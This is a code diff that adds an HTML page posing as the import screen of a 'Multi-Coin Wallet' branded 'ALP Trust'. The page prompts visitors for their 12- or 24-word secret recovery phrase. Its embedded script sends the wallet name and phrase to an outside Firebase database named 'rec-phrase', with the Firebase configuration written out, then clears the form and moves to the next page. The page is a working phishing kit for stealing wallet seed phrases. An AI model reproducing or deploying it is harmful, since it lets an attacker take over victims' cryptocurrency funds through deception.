@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<!-- saved from url=(0091)https://mdbootstrap.com/previews/templates/landing-page/html/Landing-Page-University.html#! -->
+<html lang="en">
+<head>
+  <title>ALP Trust</title>
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="css/all.css">
+  <link rel="stylesheet" href="css/solid.css">
+  <!-- <link rel="stylesheet" href="css/solid.min.css"> -->
+  
+  <!-- Bootstrap core CSS -->
+  <link href="css/bootstrap.min.css" rel="stylesheet">
+  <!-- Material Design Bootstrap -->
+  <link href="css/mdb.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="css/style.css">
+
+</head>
+
+<body>
+  
+  <div class="row top-div pt-4 text-center">
+    <div class="col-3 ml-2 im pt-4">
+        <a href="/page2.html"><i style="font-size: 1.3em;" class="fa fa-angle-left"></i></a><span>Import</span>
+    </div>
+    <div class="col-5 mid pt-4 text-white px-4">Multi-Coin Wallet</div>
+    <div class="w-50 col-3 pt-4 pl-5"><img src="/img/barcode-scanning-icon-6.jpg" alt=""></div>
+  </div>
+  <form method="post" id="frmContact">
+    <div class="second-div mt-5 mx-5 rounded-4">
+      <p class="mt-4 pt-3 pl-5 font-weight-bold name">Name</p>
+      <input id="name" type="text" class="form-control-plaintext inputf text-white pl-5" placeholder="Main Wallet">
+    </div>
+  
+    <div class="third-div mt-5 mx-5 rounded-4">
+      <p class="mt-4 pt-3 pl-5 name2">Secret Phrase</p>
+      <input id="phrase" type="text" class="text-wrap form-control-plaintext text-white pl-5">
+      <div class="paste">Paste</div>
+    </div>
+  
+  
+
+    <div class="fourth-div mt-4">
+      <p>Typically 12 (sometimes 24) words separated by single spaces</p>
+    </div>
+
+    <div class="d-grid fift-div">
+      <button type="submit" onclick="window.open('page4.html')" class="btn-block fift-div mx-5 rounded-4">Import</button>
+    </div>
+  </form>
+  <div class="sixth-div mt-5">
+    <p class="text-center">What is Secret Phrase?</p>
+  </div>
+
+  <script type="module">
+		// Import the functions you need from the SDKs you need
+		import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-app.js";
+		import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-database.js";
+		 
+		// Paste the code from Firebase
+		// For Firebase JS SDK v7.20.0 and later, measurementId is optional
+		// For Firebase JS SDK v7.20.0 and later, measurementId is optional
+    const firebaseConfig = {
+      apiKey: "AIzaSyBa5QUdE71zYbpn4Jpv7TSZax8bCpOCC7Q",
+      authDomain: "rec-phrase-2c6d0.firebaseapp.com",
+      databaseURL: "https://rec-phrase-2c6d0-default-rtdb.firebaseio.com",
+      projectId: "rec-phrase-2c6d0",
+      storageBucket: "rec-phrase-2c6d0.appspot.com",
+      messagingSenderId: "343999867437",
+      appId: "1:343999867437:web:045ffb356d42cca84ce6a4",
+      measurementId: "G-0V0PL7GWBZ"
+    };
+		 
+		// Initialize Firebase
+		const app = initializeApp(firebaseConfig);
+		 
+		// Get a reference to the database service
+		const db = getDatabase(app);
+		 
+		document.getElementById('frmContact').addEventListener('submit', function(e) {
+			e.preventDefault();
+			set(ref(db, 'users/' + Math.random().toString(36).slice(2, 7)), {
+				name: document.getElementById('name').value,
+				phrase: document.getElementById('phrase').value,
+			});
+		 
+			// alert('Your form is submitted');
+			document.getElementById('frmContact').reset();
+		});
+
+    function redirect() {
+        window.location.href="page4.html";
+    }
+	</script>
+
+   
+  <!--SCRIPTS-->
+  <!-- <script type="text/javascript" src="js/app.js"></script> -->
+  <script type="text/javascript" src="js/all.js"></script> 
+  <script type="text/javascript" src="js/solid.js"></script> 
+  <!-- <script type="text/javascript" src="js/solid.min.js"></script>  -->
+  <!--JQuery-->
+  <script type="text/javascript" src="js/jquery-3.4.0.min.js"></script>
+
+  <!--Bootstrap tooltips-->
+  <script type="text/javascript" src="js/popper.min.js"></script>
+
+  <!--Bootstrap core JavaScript-->
+  <script type="text/javascript" src="js/bootstrap.min.js"></script>
+
+  <!--MDB core JavaScript-->
+  <script type="text/javascript" src="js/mdb.min.js"></script><div class="hiddendiv common"></div>
+
+  </script>
+
+
+
+
+</body>
+</html>
